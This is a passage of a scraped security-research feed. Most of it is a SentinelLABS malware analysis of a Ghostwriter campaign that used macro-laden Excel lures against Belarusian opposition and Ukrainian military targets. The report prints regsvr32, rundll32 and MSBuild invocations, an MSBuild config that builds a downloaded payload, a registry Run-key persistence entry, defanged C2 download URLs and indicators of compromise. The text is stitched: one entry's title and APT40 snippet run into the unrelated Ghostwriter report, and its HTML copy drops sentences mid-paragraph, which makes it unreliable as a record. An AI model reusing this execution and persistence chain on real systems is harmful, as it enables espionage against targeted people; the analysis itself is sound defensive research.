SHA-1\n09ec44b6d3555a0397142b4308825483b479bf5a\n0de065d58b367ffb28ce53bc1dc023f95a6d0b89\n13de9fcd4e7c36d32594924975b7ef2b91614556\n2322964ea57312747ae9d1e918811201a0c86e9c\n253684ea43cb0456a6fec5728e1091ff8fcb27cf\n36b4e424ce8082d7606bb9f677f97c0f594f254d\n3a443c72995254400da30fe203f3fbf287629969\n3a7cc815b921166006f31c1065dadfeb8d5190e6\n4d24dd5c166fa471554ed781180e353e6b9642b7\n51ec20e5356bbebd43c03faae56fca4c3bbe318e\n55affc664472c4657c8534e0508636394eac8828\n5620b527dfc71e2ee7efb2e22a0441b60fd67b84\n5fde3180373c420cfa5cfdea7f227a1e1fe6936c\n62e66bae4b892593009d5261d898356b6d0be3ef\n6b65c296d9e1cda5af2f7dab94ce8e163b2a4ca8\n6c56b986893dd1de83151510f4b6260613c5fbb9\n6f342ff77cd43921210d144a403b8abb1e541a8b\n7129194c63ae262c814da8045879aed7a037f196\n71464c4f145c9a43ade999d385a9260aabcbf66d\n730192b0f62e37d4d57bae9ff14ec8671fbf051e\n769aa6ab69154ca87ccba0535e0180a985c21a0c\n76aab3ab0f3f16cf30d7913ff767f67a116ff1e7\n853fde052316be7887474996538b31f6ac0c3963\n9d43494c6f87414c67533cce5ec86754311631fc\n9f6ed2427e959e92eb1699024f457d87fa7b5279\naa72065673dc543e6bf627c7479bfe8a5e42a9c4\naac26242f4209bc59c82c8f223fcf2f152ce44bc\nb643a1f2c4eb436db26763d5e2527f6bebe8bcbf\nbbd754e36aee4702b9f20b90d509248945add4ea\ncb194612ed003eaf8d8cf6ed3731f21f3edeb161\ncc63ee921c29f47612096c34d6ee3ef244b33db2\ne12c6911997d7c2af5550b7e989f1dc57b6733b8\neae675812c4274502051d6f2d36348f77a8464a0\nf1c7c5d0870fd0abb7e419f2c2ba8df42fa74667\nf2e71c9cbc4a18482a11ca3f54f2c958973360b4\nfb7fdcc2fe11e95065a0ce9041348984427ca0f4","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot-ftr.jpg","length":"614617","type":"image/jpeg"},"dc:creator":"Alex Delamotte &amp; Jim Walter","content":"AkiraBot uses OpenAI to generate custom outreach messages to spam chat widgets and website contact forms at scale.","contentSnippet":"AkiraBot uses OpenAI to generate custom outreach messages to spam chat widgets and website contact forms at scale.","guid":"https://www.sentinelone.com/?post_type=labs&p=117809","categories":["MalSpam","OpenAI"],"isoDate":"2025-04-09T15:00:36.000Z","tag":"intel"},{"creator":"LABScon","title":"LABScon24 Replay | A Walking Red Flag (With Yellow Stars)","link":"https://www.sentinelone.com/labs/labscon24-replay-a-walking-red-flag-with-yellow-stars/","pubDate":"Mon, 31 Mar 2025 13:00:23 +0000","content:encoded":"<p>APT40 used CTFs at Hainan University to recruit hackers and source software vulnerabilities for operations.

The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government/\" target=\"_blank\" rel=\"noopener noreferrer\">UNC1151</a> (Mandiant) or <a href=\"https://cert.gov.ua/search/UAC-0057\" target=\"_blank\" rel=\"noopener noreferrer\">UAC-0057</a> (CERT-UA). Some public reports may use the term &#8220;Ghostwriter APT&#8221; interchangeably to refer to both the threat actor and its associated campaigns.</p>\n<p>Previous <a href=\"https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">research</a> on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described <a href=\"https://cert.gov.ua/article/6280159\" target=\"_blank\" rel=\"noopener noreferrer\">activity</a> in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the <a href=\"https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/\" target=\"_blank\" rel=\"noopener noreferrer\">likely targeting</a> of the Ministry of Defense.</p>\n<p>SentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.</p>\n<h2>Weaponized XLS 1 | &#8220;Political Prisoners in Minsk Courts&#8221;</h2>\n<p>SentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (<code>vladimir.nikiforeach@gmail[.]com</code>). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (<code>ebb30fd99c2e6cbae392c337df5876759e53730d</code>) with the file name <code>политзаключенные(по судам минска).xls</code> (“Political prisoners (across courts of Minsk).xls”).</p>\n<p>The title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign <a href=\"https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">pointed to</a> the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that <a href=\"https://en.wikipedia.org/wiki/2025_Belarusian_presidential_election\" target=\"_blank\" rel=\"noopener noreferrer\">took place</a> shortly after on Jan 26, 2025.</p>\n<p>The XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.</p>\n<figure id=\"attachment_114850\" aria-describedby=\"caption-attachment-114850\" style=\"width: 1837px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg\" alt=\"Obfuscated macro inside the XLS spreadsheet\" width=\"1837\" height=\"752\" class=\"size-full wp-image-114850\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1536x629.jpg 1536w\" sizes=\"auto, (max-width: 1837px) 100vw, 1837px\" /><figcaption id=\"caption-attachment-114850\" class=\"wp-caption-text\">Obfuscated macro inside the XLS spreadsheet</figcaption></figure>\n<p>On execution, the macro writes a file to <code>%Temp%\\Realtek(r)Audio.dll</code>.</p>\n<p>The DLL file is loaded with the following command line invocation:</p>\n<pre>\r\nC:\\Windows\\System32\\regsvr32.exe /u /s \"C:\\Temp\\Realtek(r)Audio.dll”\r\n</pre>\n<p>This starts the standard Windows process <code>regsvr32.exe</code>, which calls the <code>DllUnregisterServer</code> function implemented inside the DLL; the function then loads and executes the .NET assembly described next.</p>\n<p>Analysis of <code>Dwnldr.dll</code> shows that it is a DLL file with a .NET assembly embedded inside.

The internal filename (<code>Dwnldr.dll</code>) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.</p>\n<p>As a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.</p>\n<p>During code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to <code>%AppData%\\Roaming\\Microsoft\\temp.xlsx</code> and downloads additional file(s) from the Web.</p>\n<p>The <code>temp.xlsx</code> decoy file (<code>18151b3801bd716b5a33cfc85dbdc4ba84a00314</code>) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the <code>политзаключенные (по судам минска).xls</code> file.</p>\n<figure id=\"attachment_114854\" aria-describedby=\"caption-attachment-114854\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg\" alt=\"Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names\" width=\"1999\" height=\"803\" class=\"size-full wp-image-114854\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-300x121.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1024x411.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-768x309.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1536x617.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-114854\" class=\"wp-caption-text\">Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names</figcaption></figure>\n<p>The spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source.

We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers.

However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client&#8217;s profile (browser user agent, IP address of the client, and matching time of the operation window). <a href=\"https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine\" target=\"_blank\" rel=\"noopener noreferrer\">Research</a> in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.</p>\n<p>Given the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.</p>\n<h2>Weaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”</h2>\n<p>A file bearing the Ukrainian name <code>Zrazok.xls</code> (“Sample.xls”) is an XLS file (<code>301ffdf0c7b67e01fd2119c321e7ae09b7835afc</code>) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.</p>\n<p>For this script, the attackers used a popular obfuscator tool called <a href=\"https://github.com/sevagas/macro_pack\" target=\"_blank\" rel=\"noopener noreferrer\">Macropack</a>, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.</p>\n<figure id=\"attachment_114845\" aria-describedby=\"caption-attachment-114845\" style=\"width: 1837px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg\" alt=\"Macropack-obfuscated VBA macro found inside the spreadsheet\" width=\"1837\" height=\"752\" class=\"size-full wp-image-114845\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1536x629.jpg 1536w\" sizes=\"auto, (max-width: 1837px) 100vw, 1837px\" /><figcaption id=\"caption-attachment-114845\" class=\"wp-caption-text\">Macropack-obfuscated VBA macro found inside the spreadsheet</figcaption></figure>\n<p>As in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to <code>%AppData%\\Roaming\\Microsoft\\bruhdll32.dll</code>) is loaded with <code>rundll32.exe</code> and respective commandline arguments to run an exported function.

In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.</p>\n<p>PicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (<i>aka</i> UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).</p>\n<p>Throughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.</p>\n<h2>Conclusion</h2>\n<p>The Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.</p>\n<p>While Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.</p>\n<p>The campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.</p>\n<div id=\"threattips\"></div>\n<p>We would like to express our thanks to partners in the region, including <a href=\"https://resident.ngo/\" target=\"_blank\" rel=\"noopener noreferrer\">RESIDENT.NGO</a> and others who remain unnamed, for their invaluable collaboration. </p>\n<p>Organizations that believe they may have been targeted by threat actors involved in this campaign are invited to reach out to the SentinelLABS team via <a href=\"mailto:ThreatTips@sentinelone.com\" target=\"_blank\" rel=\"noopener noreferrer\">ThreatTips@sentinelone.com</a>.</p>\n<h2>Indicators of Compromise</h2>\n<div style=\"font-size:0.9em\">\n<b>Weaponized Excel Workbooks and Decoys</b></p>\n<div style=\"overflow-x:auto;\">\n<table style=\"border-collapse: collapse; width: 100%; height: 120px;\">\n<tbody>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\"><strong>SHA-1</strong></td>\n<td style=\"width: 35.0%; height: 24px;\"><strong>File Name</strong></td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">18151b3801bd716b5a33cfc85dbdc4ba84a00314</td>\n<td style=\"width: 35.0%; height: 24px;\">temp.xlsx</td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">2c06c01f9261fe80b627695a0ed746aa8f1f3744</td>\n<td style=\"width: 35.0%; height: 24px;\">Донесення 5 реч фонд зборів- зразок.xls</td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">301ffdf0c7b67e01fd2119c321e7ae09b7835afc</td>\n<td style=\"width: 35.0%; height: 24px;\">Zrazok.xls</td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">853da593d2a489c2bd72a284a362d7c68c3a4d4c</td>\n<td style=\"width: 35.0%; height: 24px;\">Додаток 8 реч новий.xls</td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">9d110879d101bcaec7accc3001295a53dc33371f</td>\n<td style=\"width: 35.0%; height: 24px;\">Донесення 5 реч &#8211; зразок.xls</td>\n</tr>\n<tr style=\"height: 24px;\">\n<td style=\"width: 65.0%; height: 24px;\">ebb30fd99c2e6cbae392c337df5876759e53730d</td>\n<td style=\"width: 35.0%; height: 24px;\">политзаключенные (по судам минска).xls</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><b>Downloaders</b><br />\n18bcc91ad3eed529d44926f4ae65acf44480f39d<br />\n64fca582cb69d9dc2afb1b432df58fb32ac18ca1<br />\n7261ad5d4e760aa88df94b734bc44598a090852a<br />\n9fa00a4ee4e95bc50a3919d2d3c0be2a567d8845<br />\ne5ebc7deca1ff1f0a4b1462d37ef813dad8413a6</p>\n<p><b>LibCMD helper file</b><br />\n4ae6b8adc980ba8a212b838f3ca6a9718d9a3757</p>\n<p><b>C2 Domains</b><br />\namericandeliriumsociety[.]shop<br />\ncookingwithbooks[.]shop<br />\neverythingandthedog[.]shop<br />\npigglywigglystores[.]shop<br />\nsciencealert[.]shop\n</div>\n","content:encodedSnippet":"Executive Summary\nSentinelLABS has observed a campaign targeting opposition activists in Belarus as well as Ukrainian military and government organizations.\nThe campaign has been in preparation since July-August 2024 and entered the active phase in November-December 2024.\nRecent malware samples and command-and-control (C2) infrastructure activity indicate that the operation remains active in recent days.\nSentinelLABS assesses that this cluster of threat activity is an extension of the long-running Ghostwriter campaign identified in previous public reporting.\nGhostwriter | Background\nGhostwriter is a long-running campaign likely active since 2016 and subsequently described in various public reports throughout 2020 to 2024. The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names UNC1151 (Mandiant) or UAC-0057 (CERT-UA). Some public reports may use the term “Ghostwriter APT” interchangeably to refer to both the threat actor and its associated campaigns.\nPrevious research on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described activity in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the likely targeting of the Ministry of Defense.\nSentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.\nWeaponized XLS 1 | “Political Prisoners in Minsk Courts”\nSentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (vladimir.nikiforeach@gmail[.]com). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (ebb30fd99c2e6cbae392c337df5876759e53730d) with the file name политзаключенные(по судам минска).xls (“Political prisoners (across courts of Minsk).xls”).\nThe title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign pointed to the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that took place shortly after on Jan 26, 2025.\nThe XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.\nObfuscated macro inside the XLS spreadsheet\nOn execution, the macro writes a file to %Temp%\\Realtek(r)Audio.dll.\nThe DLL file is loaded with the following command line invocation:\n\r\nC:\\Windows\\System32\\regsvr32.exe /u /s \"C:\\Temp\\Realtek(r)Audio.dll”\r\n\nThis starts the standard Windows process regsvr32.exe, which calls the DllUnregisterServer function implemented inside the DLL; the function then loads and executes the .NET assembly described next.\nAnalysis of Dwnldr.dll shows that it is a DLL file with a .NET assembly embedded inside. The file is protected with ConfuserEx – a publicly available tool that helps to obfuscate .NET programs and observed in previous Ghostwriter campaigns.\nThe DLL file hosts a payload that appears to be a simplified variant of PicassoDownloader, a malware family also linked to Ghostwriter activity. The internal filename (Dwnldr.dll) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.\nAs a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.\nDuring code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to %AppData%\\Roaming\\Microsoft\\temp.xlsx and downloads additional file(s) from the Web.\nThe temp.xlsx decoy file (18151b3801bd716b5a33cfc85dbdc4ba84a00314) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the политзаключенные (по судам минска).xls file.\nDecoy document containing lists of people with criminal charges, prosecutors’ and judges’ names\nThe spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source. However, the information was already in the public domain and can be found on the website of a proscribed Belarusian human rights organization, Spring96.\nOnce the decoy Excel file is opened, the Downloader attempts to fetch the next stage from the following URL:\n\r\nhttps://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg\r\n\nThe JPG image file fetched from the C2\nWe note that the .shop top level domain was also reported in other Ghostwriter activity seen in 2024.\nWhen the malware issues the HTTP request, it uses a hardcoded User-Agent string:\n\r\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/555.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n\nThe fetched file (8d2bb96e69df059f279d97989690ce3e556a8318) is a benign JPEG file, originating from publicly available photo stock, with no extra payload or any hidden cave where code could be embedded. We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers. It would seem the attackers not only reused the JPG file contents from a legitimate website but also copied its original URL, changing only the top level domain:\n\r\nhttps://www.everythingandthedog.com/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.\r\n\nOnce the file is downloaded, it is renamed and then saved to %APPDATA%\\Roaming\\Microsoft\\SystemCertificates\\CertificateCenter.dll.\nLater, it is registered to load during autostart by leveraging the Registry Run key:\n\r\nHKCU\\System\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Certificate Center\r\n\nwith its value pointing to expanded environment variable string:\n\r\nrundll32.exe C:\\Users\\\\AppData\\Roaming\\Microsoft\\SystemCertificates\\CertificateCenter.dll,#1\r\n\nThis Registry entry makes rundll32.exe load the DLL and execute its exported function with ordinal 1 whenever a user logs on.\nOverview of the malware stages for Weaponized XLS 1\nDuring our analysis we only observed the benign JPG file being downloaded. However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client’s profile (browser user agent, IP address of the client, and matching time of the operation window). Research in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.\nGiven the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.\nWeaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”\nA file bearing the Ukrainian name Zrazok.xls (“Sample.xls”) is an XLS file (301ffdf0c7b67e01fd2119c321e7ae09b7835afc) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.\nFor this script, the attackers used a popular obfuscator tool called Macropack, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.\nMacropack-obfuscated VBA macro found inside the spreadsheet\nAs in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to %AppData%\\Roaming\\Microsoft\\bruhdll32.dll) is loaded with rundll32.exe and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file and opens it with Excel.\nThe decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)\nThis module attempts to download the next stage from the following URL (unavailable at the time of writing):\n\r\nhttps://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg\r\n\nWhen the malware issues the HTTP request it uses a hardcoded User-Agent string that differs slightly from the previous case:\n\r\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n\nNotably, this file (52e894acf0e14d27f8997d2174c1f40d6d87bba9) was previously uploaded to VirusTotal on December 19, 2024.\nImage file fetched from the malicious URL\nAs with the previous case, the image file and its URL path appear to be copied from a public blog, published on Nov 16, 2024:\n\r\nhttps://www.sciencealert.com/scientists-reveal-the-shape-of-a-black-holes-corona-for-the-very-first-time\r\n\nAgain, the file name and the path on the malicious server were nearly identical to the legitimate one, with the actor changing only the top level domain from .com to .shop.\n\r\nhttps://www.sciencealert.com/images/2024/11/black-hole-coronaxx.jpg\r\n\nIn this case, the downloaded file is expected to be an archive in a GZIP format. Once downloaded, the malware decompresses it and saves it to the following location:\n\r\n%APPDATA%\\Roaming\\Microsoft\\SystemCertificates\\CertificateCenter.dll\r\n\nIt also creates an additional text config file at:\n\r\n%APPDATA%\\Roaming\\Microsoft\\SystemCertificates\\config\r\n\nThe config file contains the following data:\n\r\n<Project xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\r\n <PropertyGroup>\r\n  <AssemblyName>Certificate</AssemblyName>\r\n  <OutputPath>Bin\\</OutputPath>\r\n </PropertyGroup>\r\n <ItemGroup>\r\n  <Compile Include=\"CertificateCenter.dll\" />\r\n </ItemGroup>\r\n <Target Name=\"Build\">\r\n  <MakeDir Directories=\"$(OutputPath)\" Condition=\"!Exists('$(OutputPath)')\" />\r\n  <Csc Sources=\"@(Compile)\" OutputAssembly=\"$(OutputPath)$(AssemblyName).exe\" />\r\n </Target>\r\n</Project>\r\n\nThe config file is used by the Downloader to execute MSBuild.exe, instructing it to build a new application:\n\r\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe %AppData%\\Roaming\\Microsoft\\SystemCertificates\\config\r\n\nThis suggests that the CertificateCenter.dll file is not a binary as the file extension would suggest but rather contains program source code. The command, if successful, produces an executable file in the following location:\n\r\n%AppData%\\Roaming\\Microsoft\\SystemCertificates\\Bin\\Certificate.exe\r\n\nand likely contains the next stage of the infection chain.\nOverview of the malware stages for Weaponized XLS 2\nWeaponized XLS 3 | “Supplies for Ukraine Armed Forces”\nA file bearing the Ukrainian name Донесення 5 реч - зразок.xls (“Report 5 items – sample.xls”) is an XLS file (9d110879d101bcaec7accc3001295a53dc33371f) hosting another VBA payload obfuscated with Macropack.\nAs in the previous cases, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to %AppData%\\Roaming\\Microsoft\\bruhdll32.dll) is loaded with rundll32.exe and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file on disk and opens it with Excel.\nThe decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)\nAgain, the malware uses the same payload retrieval technique and downloads a JPG file from yet another .shop domain:\n\r\nhttps://cookingwithbooks[.]shop/images/qwerty.jpg\r\n\nThe URL is unavailable at the time of writing, but data from VirusTotal indicates that the downloaded file is identical to the black hole image described above in the Weaponized XLS 2 section. The malware logic is also identical with Weaponized XLS 2.\nWeaponized XLS 4 & 5 | Variations on a Theme\nIn addition to the previous findings, we discovered further related XLS files that were similarly weaponized. The files Донесення 5 реч фонд зборів- зразок.xls (“Report 5 items collection fund- sample.xls”; 2c06c01f9261fe80b627695a0ed746aa8f1f3744) and Додаток 8 реч новий.xls (“Addition 8 items new – sample.xls”; 853da593d2a489c2bd72a284a362d7c68c3a4d4c) were first uploaded from Ukraine in Feb 2025.\nBoth files contain a Macropack-obfuscated VBA macro; however, they differ in structure. Functionally, both drop a DLL to the previously noted path %AppData%\\Roaming\\Microsoft\\bruhdll32.dll.\nAgain, the DLL is loaded with rundll32.exe and respective command line arguments to execute an exported function. Next, the victim sees a decoy workbook open in Excel.\n\nThe decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)\nThe decoys are similar and the obfuscation technique, code structure, and the embedded URL are common to both:\n\r\nhttps://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png\r\n\nThe User-Agent string in the HTTP request, however, is different, with the operating system and architectures specified as “Windows NT 10.0; Win64; x64”.\n\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71\r\n\nThese variants of the malware also contain another embedded .NET DLL, internally referred to as LibCMD from the original filename LibCMD.dll (4ae6b8adc980ba8a212b838f3ca6a9718d9a3757). This is a small file, whose purpose is simply to start cmd.exe and connect to stdin/stdout.\nThe file contains a tampered PE link timestamp. It is never saved to disk; instead, it is loaded dynamically in memory as a .NET assembly and executed.\nOverview of the malware stages for Weaponized XLS 4 & 5\nAttribution\nAnalysis of techniques used by threat actors can often be helpful in establishing the origin of the attack and the malware it uses. In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.\nPicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (aka UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).\nThroughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.\nConclusion\nThe Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.\nWhile Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.\nThe campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.\n\nWe would like to express our thanks to partners in the region, including RESIDENT.NGO and others who remain unnamed, for their invaluable collaboration. \nOrganizations that believe they may have been targeted by threat actors involved in this campaign are invited to reach out to the SentinelLABS team via ThreatTips@sentinelone.com.\nIndicators of Compromise\nWeaponized Excel Workbooks and Decoys\nSHA-1\nFile Name\n\n\n18151b3801bd716b5a33cfc85dbdc4ba84a00314\ntemp.xlsx\n\n\n2c06c01f9261fe80b627695a0ed746aa8f1f3744\nДонесення 5 реч фонд зборів- зразок.xls\n\n\n301ffdf0c7b67e01fd2119c321e7ae09b7835afc\nZrazok.xls\n\n\n853da593d2a489c2bd72a284a362d7c68c3a4d4c\nДодаток 8 реч новий.xls\n\n\n9d110879d101bcaec7accc3001295a53dc33371f\nДонесення 5 реч – 